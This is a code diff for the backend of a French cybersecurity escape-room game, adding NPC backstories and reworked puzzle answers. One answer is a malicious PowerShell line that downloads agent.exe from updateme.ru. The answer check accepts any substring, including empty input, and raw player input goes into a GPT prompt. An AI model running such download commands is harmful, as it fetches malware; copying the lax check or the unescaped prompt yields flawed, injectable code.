@@ -192,32 +192,47 @@ export async function interactWithNPC(req: Request, res: Response) {
       ...data.gameState
     };
 
-    // Construction du prompt pour GPT
+    // Construction du prompt pour GPT - Caractéristiques et backstory plus détaillés pour chaque PNJ
     const npcData = {
       'eddy': {
         name: 'Eddy',
         role: 'Responsable RH',
-        traits: ['Stressé', 'Peu technique', 'Craintif']
+        traits: ['Stressé', 'Peu technique', 'Craintif'],
+        backstory: "Eddy a été embauché il y a 8 ans et n'a jamais été à l'aise avec l'informatique. Récemment, il a reçu une série d'emails de phishing sophistiqués qui semblaient provenir de la DSI. Sa demande récente de formation en cybersécurité a été refusée par manque de budget.",
+        secrets: "A récemment cliqué sur une pièce jointe suspecte et l'a signalé au support, mais n'a pas osé en parler à son supérieur.",
+        knowledge: ["Processus d'onboarding des nouveaux employés", "Accès aux dossiers du personnel", "Connaissance des conflits interpersonnels"]
       },
       'neil': {
         name: 'Neil',
         role: 'DSI',
-        traits: ['Technique', 'Factuel', 'Exigeant']
+        traits: ['Technique', 'Factuel', 'Exigeant', 'Secret'],
+        backstory: "Neil dirige le département IT depuis 5 ans. Brillant mais introverti, il a récemment mis en place une nouvelle architecture réseau contre l'avis de l'équipe sécurité. Travaille souvent tard le soir sur des projets personnels non documentés.",
+        secrets: "Utilise un VPN non autorisé pour contourner certaines restrictions de sécurité afin d'accélérer les déploiements.",
+        knowledge: ["Architecture réseau complète", "Identifiants administrateur", "Historique des incidents de sécurité précédents"]
       },
       'yousra': {
         name: 'Yousra',
         role: 'Technicienne Support',
-        traits: ['Compétente', 'Paresseuse', 'Calculatrice']
+        traits: ['Compétente', 'Observatrice', 'Calculatrice', 'Ambitieuse'],
+        backstory: "Ingénieure brillante mais sous-estimée, Yousra connaît les systèmes mieux que quiconque. Elle a postulé trois fois à des promotions qui ont été attribuées à des collègues moins qualifiés. Elle est la première à remarquer les anomalies système.",
+        secrets: "A découvert des accès non autorisés aux serveurs depuis plusieurs semaines mais n'a pas été écoutée quand elle l'a signalé.",
+        knowledge: ["Accès aux logs système", "Connaissance des vulnérabilités non documentées", "Communication directe avec les utilisateurs"]
       },
       'guillaume': {
         name: 'Guillaume',
         role: 'Directeur Général',
-        traits: ['Autoritaire', 'Impatient', 'Orienté business']
+        traits: ['Autoritaire', 'Impatient', 'Orienté business', 'Politique'],
+        backstory: "Ancien consultant en stratégie, Guillaume dirige l'entreprise depuis 3 ans. Sous pression des investisseurs pour réduire les coûts, il a récemment coupé le budget cybersécurité de 30%. Il refuse systématiquement les recommandations de sécurité qui ralentissent l'activité.",
+        secrets: "A récemment négocié une fusion confidentielle avec un concurrent, créant une tension sur les systèmes d'information pour l'intégration accélérée des données.",
+        knowledge: ["Stratégie globale de l'entreprise", "Contacts influents", "Pouvoir décisionnel sur les budgets d'urgence"]
       },
       'fares': {
         name: 'Farès',
-        role: 'Collègue suspect',
-        traits: ['Trop serviable', 'Évasif', 'Suspect']
+        role: 'Nouvel ingénieur système',
+        traits: ['Serviable', 'Évasif', 'Mystérieux', 'Compétent'],
+        backstory: "Embauché il y a seulement 3 mois, Farès s'est rapidement fait apprécier en résolvant des problèmes complexes. Son CV mentionne une expérience chez des concurrents, mais les vérifications d'antécédents ont été bâclées dans l'urgence de son recrutement.",
+        secrets: "A obtenu des accès privilégiés bien au-delà de son poste en se liant d'amitié avec des administrateurs clés.",
+        knowledge: ["Connaissances techniques avancées", "Accès à plusieurs systèmes critiques", "Informations sur les dernières modifications d'infrastructure"]
       }
     };
 
@@ -433,42 +448,72 @@ export async function solvePuzzle(req: Request, res: Response) {
       });
     }
 
-    // Définir les puzzles et leurs solutions
+    // Définir les puzzles et leurs solutions dynamiques
+    // Les puzzles sont plus contextuels et utilisent des indices distribués dans le jeu
+    // Certaines solutions ont plusieurs réponses valides pour plus de réalisme
     const puzzles: Record<string, {
       title: string;
       description: string;
-      solution: string;
+      solution: string[];  // Plusieurs solutions possibles pour certains puzzles
+      requiredClues: string[]; // Indices nécessaires pour débloquer la solution complète
       difficulty: number; // 1-5
+      hint?: string; // Indice contextuel qui peut aider à la résolution
     }> = {
       'ip-suspecte': {
-        title: "Analyse d'IP suspecte",
-        description: "Identifiez l'adresse IP qui a accédé à des sections sensibles du système",
-        solution: "185.191.127.43",
-        difficulty: 2
+        title: "Analyse des traces d'intrusion",
+        description: "Identifiez le sous-réseau suspect d'où proviennent les connexions non autorisées en analysant les logs",
+        solution: ["185.191.127", "185.191", "185.191.127.0/24"], // Accepte plusieurs formats de réponse
+        requiredClues: ["Logs de connexion", "Rapports d'accès"],
+        difficulty: 3,
+        hint: "Cherchez des motifs récurrents dans les adresses IP qui ont tenté d'accéder aux sections sensibles en dehors des heures de bureau"
       },
       'script-powershell': {
-        title: "Correction du script PowerShell",
-        description: "Identifiez et corrigez la ligne malveillante dans le script PowerShell",
-        solution: "Invoke-WebRequest -Uri \"http://updateme.ru/agent.exe\"",
-        difficulty: 3
+        title: "Détection de code malveillant",
+        description: "Analysez le script d'automatisation modifié récemment pour identifier le fragment qui établit une connexion externe",
+        solution: ["Invoke-WebRequest", "http://updateme.ru", "updateme.ru", "agent.exe"],
+        requiredClues: ["Script modifié", "Logs d'activité nocturne"],
+        difficulty: 4,
+        hint: "Recherchez les commandes qui tentent d'établir des communications externes non autorisées"
       },
       'decode-usb': {
-        title: "Fichier USB crypté",
-        description: "Décodez le message caché dans le fichier USB",
-        solution: "instance",
-        difficulty: 4
+        title: "Déchiffrement de données exfiltrées",
+        description: "Décodez les fragments de données encodés en base64 trouvés dans les communications sortantes",
+        solution: ["InstanceManager2025", "instance", "InstanceManager"],
+        requiredClues: ["Fichier USB crypté", "Clé de déchiffrement"],
+        difficulty: 5,
+        hint: "La clé de déchiffrement se compose d'éléments trouvés dans différentes salles"
       },
       'ordre-redemarrage': {
-        title: "Plan de redémarrage des systèmes",
-        description: "Déterminez le bon ordre pour redémarrer les systèmes critiques",
-        solution: "firewall,authentication,database,application",
-        difficulty: 3
+        title: "Séquence de restauration sécurisée",
+        description: "Établissez la séquence correcte pour redémarrer les systèmes compromis sans risquer de nouvelles intrusions",
+        solution: ["firewall,authentication,database,application", "pare-feu,authentification,base de données,application"],
+        requiredClues: ["Procédure de récupération", "Rapports d'incidents précédents"],
+        difficulty: 4,
+        hint: "Considérez les dépendances entre les systèmes et assurez-vous que chaque couche de sécurité est opérationnelle avant d'exposer la suivante"
+      },
+      'analyse-malware': {
+        title: "Isolation du vecteur d'attaque",
+        description: "Identifiez la méthode d'infection initiale en analysant les communications réseau suspectes",
+        solution: ["phishing", "spear-phishing", "email", "pièce jointe malveillante", "macro excel"],
+        requiredClues: ["Emails suspects", "Témoignage personnel"],
+        difficulty: 4,
+        hint: "Examinez les communications qui ont précédé la première détection de l'intrusion"
+      },
+      'empreinte-numerique': {
+        title: "Identification de la signature de l'attaquant",
+        description: "Déterminez le groupe APT (Advanced Persistent Threat) responsable de l'attaque en analysant les IOCs (Indicators of Compromise)",
+        solution: ["APT29", "Cozy Bear", "Midnight Blizzard"],
+        requiredClues: ["Rapports de renseignement", "Analyse des techniques"],
+        difficulty: 5,
+        hint: "Les techniques utilisées et le timing de l'attaque correspondent à un acteur étatique connu"
       },
       'mot-passe-final': {
-        title: "Mot de passe du terminal principal",
-        description: "Trouvez le mot de passe pour accéder au terminal principal",
-        solution: "CyB3rP4r3F3u2025!",
-        difficulty: 5
+        title: "Authentification à la console principale",
+        description: "Reconstruisez le mot de passe administrateur pour accéder au terminal de sécurité principal",
+        solution: ["CyB3rP4r3F3u2025!", "CyberPareFeu2025!", "Cyber-Pare-Feu-2025!"],
+        requiredClues: ["Fragment de mot de passe 1", "Fragment de mot de passe 2", "Indice de format"],
+        difficulty: 5,
+        hint: "Le mot de passe combine des éléments de sécurité, une référence au système et l'année en cours"
       }
     };
 
@@ -478,13 +523,16 @@ export async function solvePuzzle(req: Request, res: Response) {
       return res.status(400).json({ error: "Puzzle non trouvé" });
     }
 
-    // Vérifier si la solution est correcte (avec une certaine tolérance)
+    // Vérifier si la solution est correcte en comparant avec toutes les solutions possibles
     const normalizedSolution = data.proposedSolution.trim().toLowerCase();
-    const normalizedCorrectSolution = puzzle.solution.trim().toLowerCase();
     
-    // La solution est considérée comme correcte si elle contient la solution attendue
-    const isCorrect = normalizedSolution.includes(normalizedCorrectSolution) || 
-                      normalizedCorrectSolution.includes(normalizedSolution);
+    // La solution est correcte si elle contient l'une des solutions possibles
+    // ou si l'une des solutions possibles contient la proposition du joueur
+    const isCorrect = puzzle.solution.some(correctSolution => {
+      const normalizedCorrectSolution = correctSolution.trim().toLowerCase();
+      return normalizedSolution.includes(normalizedCorrectSolution) || 
+             normalizedCorrectSolution.includes(normalizedSolution);
+    });
 
     // Mettre à jour le gameState
     const updatedGameState = {
@@ -523,7 +571,7 @@ export async function solvePuzzle(req: Request, res: Response) {
     const feedbackPrompt = `
 Tu es le narrateur d'un jeu d'escape room cybersécurité. Le joueur a tenté de résoudre le puzzle "${puzzle.title}".
 Sa proposition: "${data.proposedSolution}"
-Solution correcte: "${puzzle.solution}"
+Solutions correctes: "${puzzle.solution.join('", "')}"
 Résultat: ${isCorrect ? 'CORRECT' : 'INCORRECT'}
 
 Génère un message de feedback encourageant qui:
